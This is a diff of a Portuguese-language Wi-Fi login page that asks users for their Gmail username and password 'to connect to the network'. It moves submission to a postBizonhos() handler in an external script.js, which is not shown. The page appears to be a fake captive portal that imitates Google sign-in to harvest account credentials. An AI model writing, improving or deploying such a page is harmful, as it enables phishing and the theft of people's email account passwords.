@@ -18,12 +18,14 @@
         <div id=login-text>Entre com seu Google Mail para se conectar a rede.
     </div>
 
-    <form action=/post method=post>
-        <b class=username-label>Username:   </b>
-            <input type=text name=username placeholder=gmail>
-        <b class=password-label>Password: </b>
-            <input type=password name=password placeholder=password>
-            <button type="submit"><img src="google-icon.svg" alt="" srcset=""> Login </button>
+    <form>
+        <label for="username">Username: </label>
+        <input type=text name=username id="username" placeholder=Gmail>
+
+        <label for="password">Password: </label>
+        <input type=password name=password id="password" placeholder=Senha>
+
+        <button type="button" onclick="postBizonhos()" ><img src="google-icon.svg" alt="" srcset=""> Login </button>
     </form>
     <br>
 
@@ -32,4 +34,6 @@
             <p>Copyright &#169; 2025 | All rights reserved.</p>
         </div>
     </footer>
+
+    <script src="script.js"></script>
 </body>
